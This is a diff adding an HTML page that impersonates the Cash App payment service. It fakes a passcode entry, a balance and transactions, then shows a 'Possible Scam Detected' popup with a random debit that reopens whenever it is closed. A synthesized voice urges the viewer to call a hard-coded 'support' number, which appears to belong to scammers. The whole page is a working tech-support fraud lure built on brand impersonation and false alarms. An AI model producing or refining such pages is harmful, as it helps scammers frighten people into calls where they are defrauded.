@@ -1,0 +1,1273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Cash App Wallet</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+<style>
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:'Inter',sans-serif;
+}
+
+body{
+    background:#00d64f;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:100vh;
+    overflow:hidden;
+}
+
+/* APP */
+
+.app{
+    width:390px;
+    height:844px;
+    background:#f7f7f7;
+    border-radius:38px;
+    overflow:hidden;
+    position:relative;
+    box-shadow:
+    0 20px 60px rgba(0,0,0,.18);
+}
+
+/* =========================
+   SPLASH SCREEN
+========================= */
+
+.splash{
+    position:absolute;
+    inset:0;
+    background:#00d64f;
+    z-index:9999;
+
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    align-items:center;
+
+    transition:.5s ease;
+}
+
+.splash-logo{
+    width:110px;
+    height:110px;
+    border-radius:28px;
+    background:#fff;
+
+    display:flex;
+    justify-content:center;
+    align-items:center;
+
+    overflow:hidden;
+
+    box-shadow:
+    0 10px 40px rgba(0,0,0,.12);
+}
+
+.splash-logo img{
+    width:72%;
+    height:72%;
+    object-fit:contain;
+}
+
+.loader{
+    width:42px;
+    height:42px;
+    border-radius:50%;
+
+    border:3px solid rgba(255,255,255,.35);
+    border-top:3px solid #fff;
+
+    margin-top:34px;
+
+    animation:spin 1s linear infinite;
+}
+
+@keyframes spin{
+    100%{
+        transform:rotate(360deg);
+    }
+}
+
+.loading-text{
+    margin-top:22px;
+    color:#fff;
+    font-size:15px;
+    font-weight:600;
+    letter-spacing:.2px;
+}
+
+/* =========================
+   PIN SCREEN
+========================= */
+
+.pin-screen{
+    position:absolute;
+    inset:0;
+    background:#00d64f;
+
+    z-index:9998;
+
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    align-items:center;
+
+    opacity:0;
+    pointer-events:none;
+
+    transition:.5s ease;
+}
+
+.pin-title{
+    color:#fff;
+    font-size:26px;
+    font-weight:800;
+    margin-bottom:38px;
+}
+
+.pin-dots{
+    display:flex;
+    gap:18px;
+}
+
+.dot{
+    width:20px;
+    height:20px;
+    border-radius:50%;
+    background:rgba(255,255,255,.25);
+
+    transition:.25s ease;
+}
+
+.dot.active{
+    background:#fff;
+    transform:scale(1.08);
+}
+
+/* =========================
+   MAIN PAGE
+========================= */
+
+.main{
+    position:absolute;
+    inset:0;
+
+    background:#f7f7f7;
+
+    transform:translateY(40px);
+    opacity:0;
+
+    transition:.7s cubic-bezier(.2,.8,.2,1);
+
+    overflow-y:auto;
+    overflow-x:hidden;
+    padding-bottom:120px; /* keeps last transactions above bottom nav */
+    -webkit-overflow-scrolling:touch;
+}
+
+/* STATUS */
+
+.status{
+    height:54px;
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    padding:0 24px;
+
+    color:#000;
+    font-size:14px;
+    font-weight:700;
+}
+
+/* TOPBAR */
+
+.topbar{
+    padding:8px 22px 0;
+
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+}
+
+/* LOGO */
+
+.logo{
+    width:50px;
+    height:50px;
+    border-radius:16px;
+    background:#00d64f;
+
+    display:flex;
+    justify-content:center;
+    align-items:center;
+
+    overflow:hidden;
+}
+
+.logo img{
+    width:72%;
+    height:72%;
+    object-fit:contain;
+}
+
+/* PROFILE */
+
+.profile{
+    width:44px;
+    height:44px;
+    border-radius:50%;
+
+    background:#fff;
+
+    border:1px solid #ececec;
+
+    display:flex;
+    justify-content:center;
+    align-items:center;
+
+    font-size:18px;
+}
+
+/* HEADER */
+
+.header{
+    padding:14px 24px 10px;
+}
+
+/* CHART */
+
+.mini-chart{
+    margin-top:6px;
+    background:#fff;
+    border-radius:30px;
+    padding:22px;
+    border:1px solid #ececec;
+}
+
+.chart-top{
+    display:flex;
+    justify-content:space-between;
+    align-items:flex-start;
+    margin-bottom:14px;
+}
+
+.chart-balance{
+    font-size:34px;
+    font-weight:800;
+    letter-spacing:-1px;
+    color:#000;
+}
+
+.chart-growth{
+    margin-top:6px;
+    color:#00c94a;
+    font-size:14px;
+    font-weight:700;
+}
+
+.chart-pill{
+    background:#e8fff0;
+    color:#00c94a;
+    padding:8px 14px;
+    border-radius:999px;
+    font-size:12px;
+    font-weight:800;
+}
+
+.chart-svg{
+    width:100%;
+    height:120px;
+    display:block;
+}
+
+/* CTA */
+
+.cta{
+    margin:0 24px 24px;
+    background:#00d64f;
+    border-radius:30px;
+    padding:18px;
+    color:#fff;
+    position:relative;
+    overflow:hidden;
+}
+
+.cta::after{
+    content:"";
+    position:absolute;
+    right:-40px;
+    top:-40px;
+
+    width:160px;
+    height:160px;
+
+    border-radius:50%;
+
+    background:rgba(255,255,255,.12);
+}
+
+.cta-title{
+    font-size:20px;
+    font-weight:700;
+    position:relative;
+    z-index:2;
+}
+
+.cta-sub{
+    margin-top:8px;
+    font-size:14px;
+    line-height:1.5;
+    width:75%;
+
+    color:rgba(255,255,255,.92);
+
+    position:relative;
+    z-index:2;
+}
+
+.cta-btn{
+    margin-top:18px;
+    display:inline-flex;
+    align-items:center;
+    gap:10px;
+
+    background:#fff;
+    color:#000;
+
+    padding:14px 20px;
+
+    border-radius:999px;
+
+    text-decoration:none;
+
+    font-size:15px;
+    font-weight:700;
+
+    position:relative;
+    z-index:2;
+}
+
+/* SECTION */
+
+.section{
+    padding:0 24px;
+}
+
+.section-head{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    margin-bottom:18px;
+}
+
+.section-title{
+    font-size:21px;
+    font-weight:800;
+    color:#000;
+}
+
+.see-all{
+    font-size:14px;
+    font-weight:700;
+    color:#00c94a;
+}
+
+/* ACTIVITY */
+
+.activity-card{
+    background:#fff;
+    border-radius:28px;
+    padding:8px 18px;
+    border:1px solid #ededed;
+}
+
+/* ITEM */
+
+.item{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+
+    padding:18px 0;
+
+    border-bottom:1px solid #f1f1f1;
+}
+
+.item:last-child{
+    border:none;
+}
+
+.item-left{
+    display:flex;
+    align-items:center;
+    gap:14px;
+}
+
+/* ICON */
+
+.icon{
+    width:54px;
+    height:54px;
+    border-radius:18px;
+
+    display:flex;
+    justify-content:center;
+    align-items:center;
+
+    font-size:20px;
+    font-weight:700;
+}
+
+.green{
+    background:#e8fff0;
+    color:#00c94a;
+}
+
+.black{
+    background:#101010;
+    color:#fff;
+}
+
+.soft{
+    background:#f2f2f2;
+    color:#111;
+}
+
+/* TEXT */
+
+.name{
+    font-size:16px;
+    font-weight:700;
+    color:#000;
+}
+
+.time{
+    margin-top:5px;
+    font-size:13px;
+    color:#8a8a8a;
+}
+
+.amount{
+    font-size:18px;
+    font-weight:800;
+}
+
+.plus{
+    color:#00c94a;
+}
+
+.minus{
+    color:#000;
+}
+
+/* NAV */
+
+.nav{
+    position:absolute;
+    left:0;
+    right:0;
+    bottom:0;
+
+    background:#fff;
+    border-top:1px solid #ececec;
+
+    display:flex;
+    justify-content:space-around;
+
+    padding:16px 0 28px;
+
+    z-index:100;
+}
+
+.nav-item{
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:7px;
+
+    font-size:12px;
+    font-weight:600;
+
+    color:#9a9a9a;
+}
+
+.nav-item.active{
+    color:#00c94a;
+}
+
+.nav-icon{
+    font-size:22px;
+}
+
+/* SHOW MAIN */
+
+.main.show{
+    transform:translateY(0);
+    opacity:1;
+}
+
+/* MOBILE */
+
+@media(max-width:430px){
+
+    body{
+        background:#f7f7f7;
+    }
+
+    .app{
+        width:100%;
+        height:100vh;
+        border-radius:0;
+    }
+
+}
+
+/* =========================
+   POPUP
+========================= */
+
+/* =========================
+   POPUP
+========================= */
+
+.popup-wrap{
+    position:absolute;
+
+    top:126px;
+    left:24px;
+    right:24px;
+
+    z-index:999;
+
+    opacity:0;
+    pointer-events:none;
+
+    transform:
+    translateY(-24px)
+    scale(.92);
+
+    transition:.5s cubic-bezier(.2,.8,.2,1);
+}
+
+.popup-wrap.show{
+    opacity:1;
+    pointer-events:auto;
+
+    transform:
+    translateY(0)
+    scale(1);
+}
+
+.popup-card{
+
+    background:
+    rgba(255,255,255,.94);
+
+    backdrop-filter:blur(18px);
+
+    border-radius:32px;
+
+    padding:22px;
+
+    border:
+    1px solid rgba(255,255,255,.7);
+
+    box-shadow:
+    0 30px 80px rgba(0,0,0,.16),
+    0 10px 30px rgba(0,0,0,.08);
+
+    position:relative;
+
+    overflow:hidden;
+}
+
+.popup-card::after{
+
+    content:"";
+
+    position:absolute;
+
+    width:180px;
+    height:180px;
+
+    border-radius:50%;
+
+    background:
+    radial-gradient(
+        rgba(0,214,79,.12),
+        transparent
+    );
+
+    top:-80px;
+    right:-60px;
+
+    pointer-events:none;
+}
+
+.popup-badge{
+    display:inline-flex;
+
+    background:#e8fff0;
+
+    color:#00c94a;
+
+    padding:8px 14px;
+
+    border-radius:999px;
+
+    font-size:11px;
+    font-weight:800;
+}
+
+.popup-amount{
+    margin-top:16px;
+
+    font-size:30px;
+    font-weight:800;
+
+    letter-spacing:-1px;
+
+    color:#000;
+}
+
+.popup-user{
+    margin-top:4px;
+
+    font-size:17px;
+    font-weight:700;
+
+    color:#000;
+}
+
+.popup-time{
+    margin-top:6px;
+
+    color:#8e8e93;
+
+    font-size:13px;
+}
+
+.popup-btn{
+    width:100%;
+
+    margin-top:18px;
+
+    border:none;
+
+    background:#00d64f;
+    color:#fff;
+
+    padding:15px;
+
+    border-radius:16px;
+
+    font-size:14px;
+    font-weight:700;
+
+    cursor:pointer;
+}
+
+.popup-support{
+    display:flex;
+    justify-content:center;
+
+    margin-top:12px;
+
+    text-decoration:none;
+
+    color:#00c94a;
+
+    font-size:13px;
+    font-weight:700;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="app">
+
+    <!-- SPLASH -->
+
+    <div class="splash" id="splash">
+
+        <div class="splash-logo">
+            <img src="https://i.ibb.co/Wp269Dqq/vdfgvfg.png">
+        </div>
+
+        <div class="loader"></div>
+
+        <div class="loading-text" id="loadingText">
+            Cash App...
+        </div>
+
+    </div>
+
+    <!-- PIN SCREEN -->
+
+    <div class="pin-screen" id="pinScreen">
+
+        <div class="pin-title">
+            Enter Passcode
+        </div>
+
+        <div class="pin-dots">
+
+            <div class="dot" id="d1"></div>
+            <div class="dot" id="d2"></div>
+            <div class="dot" id="d3"></div>
+            <div class="dot" id="d4"></div>
+
+        </div>
+
+    </div>
+
+    <!-- MAIN -->
+
+    <div class="main" id="main">
+
+        <!-- STATUS -->
+
+        <div class="status">
+            <div id="liveTime"></div>
+            <div>5G 🔋</div>
+        </div>
+
+        <!-- TOPBAR -->
+
+        <div class="topbar">
+
+            <div class="logo">
+                <img src="https://i.ibb.co/Wp269Dqq/vdfgvfg.png">
+            </div>
+
+            <div class="profile">👤</div>
+
+        </div>
+
+        <!-- HEADER -->
+
+        <div class="header">
+
+            <div class="mini-chart">
+
+                <div class="chart-top">
+
+                    <div>
+
+                        <div class="chart-balance">
+                            $12,840
+                        </div>
+
+                        <div class="chart-growth">
+                            +12.4% This Week
+                        </div>
+
+                    </div>
+
+                    <div class="chart-pill">
+                        LIVE
+                    </div>
+
+                </div>
+
+                <svg viewBox="0 0 300 120" class="chart-svg">
+
+                    <path
+                    d="M0 90 
+                       C30 70, 50 80, 70 60
+                       C90 40, 120 50, 140 35
+                       C170 10, 210 30, 240 20
+                       C260 15, 280 25, 300 5"
+
+                    fill="none"
+                    stroke="#00d64f"
+                    stroke-width="5"
+                    stroke-linecap="round"/>
+
+                </svg>
+
+            </div>
+
+        </div>
+
+        <!-- CTA -->
+
+        <div class="cta">
+
+            <div class="cta-title">
+                Need Assistance?
+            </div>
+
+            <div class="cta-sub">
+                Contact our transfer support line for instant account help.
+            </div>
+
+            <a href="tel:18049892074" class="cta-btn">
+                📞 +1 (804) 989-2074
+            </a>
+
+        </div>
+
+        <!-- ACTIVITY -->
+
+        <div class="section">
+
+            <div class="section-head">
+
+                <div class="section-title">
+                    Recent Activity
+                </div>
+
+                <div class="see-all">
+                    See all
+                </div>
+
+            </div>
+
+            <div class="activity-card">
+
+                <!-- ITEM -->
+
+                <div class="item">
+
+                    <div class="item-left">
+
+                        <div class="icon black">
+                            ₿
+                        </div>
+
+                        <div>
+
+                            <div class="name">
+                                Bitcoin Purchase
+                            </div>
+
+                            <div class="time">
+                                Today • 9:18 AM
+                            </div>
+
+                        </div>
+
+                    </div>
+
+                    <div class="amount minus">
+                        -$620
+                    </div>
+
+                </div>
+				
+
+                <!-- ITEM -->
+
+                <div class="item">
+
+                    <div class="item-left">
+
+                        <div class="icon green">
+                            ↓
+                        </div>
+
+                        <div>
+
+                            <div class="name">
+                                Cash Deposit
+                            </div>
+
+                            <div class="time">
+                                Today • 11:42 AM
+                            </div>
+
+                        </div>
+
+                    </div>
+
+                    <div class="amount plus">
+                        +$2,400
+                    </div>
+
+                </div>
+
+
+
+                <!-- ITEM -->
+
+                <div class="item">
+
+                    <div class="item-left">
+
+                        <div class="icon soft">
+                            ↑
+                        </div>
+
+                        <div>
+
+                            <div class="name">
+                                Transfer Sent
+                            </div>
+
+                            <div class="time">
+                                Yesterday • 7:24 PM
+                            </div>
+
+                        </div>
+
+                    </div>
+
+                    <div class="amount minus">
+                        -$185
+                    </div>
+
+                </div>
+
+                <!-- ITEM -->
+
+                <div class="item">
+
+                    <div class="item-left">
+
+                        <div class="icon green">
+                            $
+                        </div>
+
+                        <div>
+
+                            <div class="name">
+                                Payment Received
+                            </div>
+
+                            <div class="time">
+                                Yesterday • 1:02 PM
+                            </div>
+
+                        </div>
+
+                    </div>
+
+                    <div class="amount plus">
+                        +$850
+                    </div>
+
+                </div>
+
+            </div>
+
+        </div>
+
+        
+    </div>
+
+<!-- NAV -->
+
+        <div class="nav">
+
+            <div class="nav-item">
+                <div class="nav-icon">🏠</div>
+            </div>
+
+            <div class="nav-item active">
+                <div class="nav-icon">$</div>
+            </div>
+
+            <div class="nav-item">
+                <div class="nav-icon">↗</div>
+            </div>
+
+            <div class="nav-item">
+                <div class="nav-icon">🕗</div>
+            </div>
+
+        </div>
+		
+		
+<!-- TRANSACTION POPUP -->
+
+<div class="popup-wrap" id="popupWrap">
+
+    <div class="popup-card">
+
+        <div class="popup-badge">
+            Possible Scam Detected
+        </div>
+
+        <div class="popup-amount" id="popupAmount">
+            -$185
+        </div>
+
+        <div class="popup-user">
+            BTC Sent to Alex Morgan
+        </div>
+
+        <div class="popup-time" id="popupTime">
+            Today • 2:41 PM
+        </div>
+
+        <button class="popup-btn" onclick="closePopup()">
+            View Transaction
+        </button>
+
+        <a href="tel:18049892074" class="popup-support">
+            📞 Contact Support
+        </a>
+
+    </div>
+
+</div>
+
+</div>
+
+<script>
+
+/* LOADING TEXT */
+
+setTimeout(()=>{
+
+    document.getElementById("loadingText").innerText =
+    "Securing Wallet...";
+
+},1500);
+
+setTimeout(()=>{
+
+    document.getElementById("loadingText").innerText =
+    "Loading Activity...";
+
+},3000);
+
+/* SPLASH TO PIN */
+
+setTimeout(()=>{
+
+    document.getElementById("splash").style.opacity="0";
+
+    setTimeout(()=>{
+
+        document.getElementById("splash").style.display="none";
+
+        const pin =
+        document.getElementById("pinScreen");
+
+        pin.style.opacity="1";
+        pin.style.pointerEvents="all";
+
+    },500);
+
+},4200);
+
+/* AUTO PIN */
+
+setTimeout(()=>{
+
+    document.getElementById("d1").classList.add("active");
+
+},5200);
+
+setTimeout(()=>{
+
+    document.getElementById("d2").classList.add("active");
+
+},5600);
+
+setTimeout(()=>{
+
+    document.getElementById("d3").classList.add("active");
+
+},6000);
+
+setTimeout(()=>{
+
+    document.getElementById("d4").classList.add("active");
+
+},6400);
+
+/* OPEN MAIN */
+
+setTimeout(()=>{
+
+    const pin =
+    document.getElementById("pinScreen");
+
+    pin.style.opacity="0";
+
+    setTimeout(()=>{
+
+        pin.style.display="none";
+
+        document
+		.getElementById("main")
+		.classList.add("show");
+		
+		document.querySelector(".nav").style.display = "flex";
+
+    },500);
+
+},7600);
+
+/* =========================
+   LIVE TIME
+========================= */
+
+function updatePopupTime(){
+
+    const now = new Date();
+
+    const time =
+    now.toLocaleTimeString([],{
+        hour:'numeric',
+        minute:'2-digit'
+    });
+
+    document.getElementById("popupTime").innerText =
+    "Today • " + time;
+
+}
+
+updatePopupTime();
+
+/* =========================
+   RANDOM AMOUNT
+========================= */
+
+const randomAmount =
+Math.floor(Math.random() * 400) + 80;
+
+document.getElementById("popupAmount").innerText =
+"-$" + randomAmount;
+
+/* =========================
+   SHOW POPUP
+========================= */
+
+setTimeout(()=>{
+
+    document
+    .getElementById("popupWrap")
+    .classList.add("show");
+
+    setTimeout(()=>{
+
+        playVerificationAlert();
+
+    },600);
+
+},9800);
+
+/* =========================
+   CLOSE
+========================= */
+
+function closePopup(){
+
+    const popup =
+    document.getElementById("popupWrap");
+
+    popup.classList.remove("show");
+
+    /* subtle chart animation */
+
+    const chart =
+    document.querySelector(".mini-chart");
+
+    chart.style.transform =
+    "scale(.98)";
+
+    chart.style.transition =
+    ".3s ease";
+
+    setTimeout(()=>{
+
+        chart.style.transform =
+        "scale(1)";
+
+    },300);
+
+    /* reopen popup */
+
+    setTimeout(()=>{
+
+        popup.classList.add("show");
+
+    },2500);
+
+}
+
+/* =========================
+   VOICE ALERT
+========================= */
+
+function playVerificationAlert(){
+
+    if(!('speechSynthesis' in window)){
+        return;
+    }
+
+    window.speechSynthesis.cancel();
+
+    const supportNumber =
+    "1 804 989 2074";
+
+    const message =
+
+    `Crypto transfer alert via Cash App Wallet. Please review the transaction details. If this activity was not authorized by you, contact Cash App support immediately on ${supportNumber}`;
+
+    const speech =
+    new SpeechSynthesisUtterance(message);
+
+    speech.rate = 0.9;
+    speech.pitch = 1;
+    speech.volume = 1;
+
+    const voices =
+    window.speechSynthesis.getVoices();
+
+    const preferred =
+    voices.find(v =>
+        v.lang.startsWith('en')
+    );
+
+    if(preferred){
+        speech.voice = preferred;
+    }
+
+    window.speechSynthesis.speak(speech);
+
+}
+
+/* =========================
+   LIVE STATUS TIME
+========================= */
+
+function updateLiveTime(){
+
+    const now = new Date();
+
+    const time =
+    now.toLocaleTimeString([],{
+        hour:'numeric',
+        minute:'2-digit'
+    });
+
+    document.getElementById("liveTime").innerText =
+    time;
+
+}
+
+updateLiveTime();
+
+setInterval(updateLiveTime,1000);
+
+</script>
+
+</body>
+</html>
